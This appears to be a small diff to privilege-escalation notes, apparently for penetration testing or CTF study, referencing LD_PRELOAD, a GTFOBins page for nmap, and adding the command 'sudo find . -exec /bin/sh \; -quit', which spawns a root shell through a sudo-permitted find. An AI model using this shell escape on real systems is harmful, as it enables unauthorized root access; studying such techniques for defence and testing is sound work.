@@ -37,3 +37,6 @@ We need to run the program by specifying the LD_PRELOAD option, as follows;
 
 Use this to find how to execute the tools in unprivileged enviornment
 https://gtfobins.org/gtfobins/nmap/
+
+you can execute `find` commands using 
+`sudo find . -exec /bin/sh \; -quit`
